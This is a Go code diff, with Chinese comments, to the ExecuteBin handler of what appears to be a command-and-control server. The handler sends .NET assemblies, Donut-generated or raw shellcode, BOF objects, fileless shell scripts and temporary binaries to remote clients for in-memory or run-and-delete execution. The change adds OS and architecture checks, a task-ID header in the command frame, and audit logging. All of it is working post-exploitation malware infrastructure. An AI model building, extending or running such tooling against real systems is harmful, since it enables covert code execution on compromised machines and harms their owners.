@@ -13,6 +13,8 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"math"
+	"strings"
 
 	"net/http"
 	"time"
@@ -123,6 +125,46 @@ var executeBinModes = map[string]bool{
 	"exec-file":        true,
 }
 
+// execModeSupportsOS 模式与客户端系统的匹配矩阵。Os 为空（老库/老客户端）
+// 时放行，交给客户端自身的平台 stub 兜底，避免升级后老会话无法执行。
+func execModeSupportsOS(mode, clientOS string) bool {
+	os := strings.ToLower(strings.TrimSpace(clientOS))
+	if os == "" {
+		return true
+	}
+	switch mode {
+	case "execute-assembly", "inline-bin", "shellcode-inject", "bof":
+		return os == "windows"
+	case "script", "binary":
+		return os == "linux"
+	case "exec-file":
+		return os == "windows" || os == "linux"
+	}
+	return false
+}
+
+// isX64Arch 判断客户端是否 64 位（Arch 为空时放行，兼容老数据）。
+// execute-assembly 的 go-clr 宿主与 BOF 加载器都只支持 amd64。
+func isX64Arch(arch string) bool {
+	a := strings.ToLower(strings.TrimSpace(arch))
+	return a == "" || a == "x64" || a == "amd64" || strings.Contains(a, "64")
+}
+
+// buildExecFrame 组装执行命令帧。对支持 EXEC_DONE 的客户端，在 mode payload
+// 前加 "EXD1" + BE32(taskID) 头，供客户端在完成回执里原样带回，实现精确归属；
+// 旧客户端保持原字节格式。
+func buildExecFrame(cmdType uint32, body []byte, taskID int64, capable bool) []byte {
+	if capable && taskID > 0 && taskID <= math.MaxUint32 {
+		hdr := make([]byte, 8)
+		copy(hdr[:4], "EXD1")
+		binary.BigEndian.PutUint32(hdr[4:], uint32(taskID))
+		body = utils.BytesCombine(hdr, body)
+	}
+	ct := make([]byte, 4)
+	binary.BigEndian.PutUint32(ct, cmdType)
+	return utils.BytesCombine(ct, body)
+}
+
 // auditBinExecute 记录内存执行载荷下发（CategoryCommand 此前全仓无人使用）。
 // args 可能很长（含命令行参数），截断后再入审计。
 func auditBinExecute(c *gin.Context, result, mode, uid, fileName string, size int, args, errMsg string) {
@@ -191,12 +233,25 @@ func ExecuteBin(c *gin.Context) {
 		return
 	}
 	// uid 必须真实存在：原来不校验，对着任意字符串也会写 shell 历史并返回 200
-	if _, err := database.GetClientByUid(uid); err != nil {
+	clientRecord, err := database.GetClientByUid(uid)
+	if err != nil || clientRecord == nil {
 		c.JSON(http.StatusNotFound, gin.H{"status": 404, "data": "客户端不存在: " + uid})
 		return
 	}
 	if !executeBinModes[mode] {
 		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "data": "Invalid execution mode"})
+		return
+	}
+	// 平台/架构预检：错配时客户端只会回一个不可见的错误（type 31），
+	// 服务端提前拦下并给出明确原因。
+	if !execModeSupportsOS(mode, clientRecord.Os) {
+		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "data": fmt.Sprintf(
+			"执行模式 %s 不支持客户端系统 %s", mode, clientRecord.Os)})
+		return
+	}
+	if (mode == "execute-assembly" || mode == "bof") && !isX64Arch(clientRecord.Arch) {
+		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "data": fmt.Sprintf(
+			"执行模式 %s 仅支持 64 位客户端（当前 Arch=%s）", mode, clientRecord.Arch)})
 		return
 	}
 	// 按模式的上限：.NET 程序集在客户端有 10MB 硬限制（见 maxAssemblyBytes 注释）
@@ -214,12 +269,14 @@ func ExecuteBin(c *gin.Context) {
 
 	auditBinExecute(c, "START", mode, uid, file.Filename, len(fileBytes), args, "")
 
-	// 任务记录（kind=exec）：成功投递后保持 dispatched，客户端回显时由 OnTaskOutput 置 completed
+	// 任务记录（kind=exec）：成功投递后保持 dispatched；新客户端由 EXEC_DONE
+	// 携带 taskID 精确收敛，旧客户端仍按输出近似完成（OnTaskOutput 兼容）。
 	var execTaskID int64
 	if _, rows := createTaskRows([]string{uid}, operatorFromContext(c), "exec",
 		mode+" "+file.Filename+" "+args); len(rows) > 0 {
 		execTaskID = rows[0].Id
 	}
+	execCapable := command.IsExecClientCapable(uid)
 
 	// 记录到 shell 历史（校验通过后再写：原来非法 mode 也会污染历史）
 	database.AppendShellContent(uid, "$ "+mode+" "+file.Filename+" "+args+"\n")
@@ -246,12 +303,8 @@ func ExecuteBin(c *gin.Context) {
 		fileLength := len(fileBytes)
 		fileLengthBytes := make([]byte, 4)
 		binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
-		byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, []byte(args))
-
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteAssembly))
-		byteToSend = append(cmdTypeBytes, byteToSend...)
-		finish(byteToSend)
+		body := utils.BytesCombine(fileLengthBytes, fileBytes, []byte(args))
+		finish(buildExecFrame(command.ExecuteAssembly, body, execTaskID, execCapable))
 	case "inline-bin":
 		var u database.Clients
 		u, _, _ = database.Clients_().GetByUID(uid)
@@ -261,28 +314,19 @@ func ExecuteBin(c *gin.Context) {
 			errorMsg := fmt.Sprintf("Unable to generate shellcode for %s: %v\n\nInline Bin mode requires files that can be converted to shellcode.\n\nFor fscan.exe and similar tools, please:\n1. Use traditional file upload and execution\n2. Convert to shellcode format first\n3. Use a shellcode generator tool", file.Filename, err)
 			finishTask(execTaskID, taskStatusFailed, "", "Donut 转换失败: "+err.Error())
 			auditBinExecute(c, "FAILURE", mode, uid, file.Filename, len(fileBytes), args, "Donut 转换失败: "+err.Error())
-			c.JSON(http.StatusOK, gin.H{"status": 400, "data": errorMsg})
+			c.JSON(http.StatusBadRequest, gin.H{"status": 400, "data": errorMsg, "task_id": execTaskID})
 			return
 		}
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineBin))
-		byteToSend := utils.BytesCombine(cmdTypeBytes, payload)
-		finish(byteToSend)
+		finish(buildExecFrame(command.InlineBin, payload, execTaskID, execCapable))
 	case "shellcode-inject":
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineBin))
-		byteToSend := utils.BytesCombine(cmdTypeBytes, fileBytes)
-		finish(byteToSend)
+		finish(buildExecFrame(command.InlineBin, fileBytes, execTaskID, execCapable))
 	case "script":
 		// Linux 脚本内存执行(fileless sh -s 管道): [4B len][script bytes][args]
 		fileLength := len(fileBytes)
 		fileLengthBytes := make([]byte, 4)
 		binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
-		byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, []byte(args))
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteLinuxScript))
-		byteToSend = append(cmdTypeBytes, byteToSend...)
-		finish(byteToSend)
+		body := utils.BytesCombine(fileLengthBytes, fileBytes, []byte(args))
+		finish(buildExecFrame(command.ExecuteLinuxScript, body, execTaskID, execCapable))
 	case "binary":
 		// Linux 二进制执行(/tmp 写执行删): [4B len][binary bytes][4B argsLen][args]
 		fileLength := len(fileBytes)
@@ -291,11 +335,8 @@ func ExecuteBin(c *gin.Context) {
 		argsBytes := []byte(args)
 		argsLenBytes := make([]byte, 4)
 		binary.BigEndian.PutUint32(argsLenBytes, uint32(len(argsBytes)))
-		byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, argsLenBytes, argsBytes)
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteLinuxBin))
-		byteToSend = append(cmdTypeBytes, byteToSend...)
-		finish(byteToSend)
+		body := utils.BytesCombine(fileLengthBytes, fileBytes, argsLenBytes, argsBytes)
+		finish(buildExecFrame(command.ExecuteLinuxBin, body, execTaskID, execCapable))
 	case "bof":
 		// BOF(COFF)内存执行: [4B len][coff bytes][4B argsLen][args]
 		fileLength := len(fileBytes)
@@ -304,11 +345,8 @@ func ExecuteBin(c *gin.Context) {
 		argsBytes := []byte(args)
 		argsLenBytes := make([]byte, 4)
 		binary.BigEndian.PutUint32(argsLenBytes, uint32(len(argsBytes)))
-		byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, argsLenBytes, argsBytes)
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteBof))
-		byteToSend = append(cmdTypeBytes, byteToSend...)
-		finish(byteToSend)
+		body := utils.BytesCombine(fileLengthBytes, fileBytes, argsLenBytes, argsBytes)
+		finish(buildExecFrame(command.ExecuteBof, body, execTaskID, execCapable))
 	case "exec-file":
 		// 文件执行(写临时文件->执行->捕获输出->删除;支持 Donut 无法转换的 Go/Rust PE)
 		// 跨平台:Windows 写 .exe 到 %TEMP%;Linux 写无扩展名到 /tmp
@@ -319,11 +357,8 @@ func ExecuteBin(c *gin.Context) {
 		argsBytes := []byte(args)
 		argsLenBytes := make([]byte, 4)
 		binary.BigEndian.PutUint32(argsLenBytes, uint32(len(argsBytes)))
-		byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, argsLenBytes, argsBytes)
-		cmdTypeBytes := make([]byte, 4)
-		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteFile))
-		byteToSend = append(cmdTypeBytes, byteToSend...)
-		finish(byteToSend)
+		body := utils.BytesCombine(fileLengthBytes, fileBytes, argsLenBytes, argsBytes)
+		finish(buildExecFrame(command.ExecuteFile, body, execTaskID, execCapable))
 	default:
 		// 白名单已在入口拦住，这里只是兜底
 		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "data": "Invalid execution mode"})
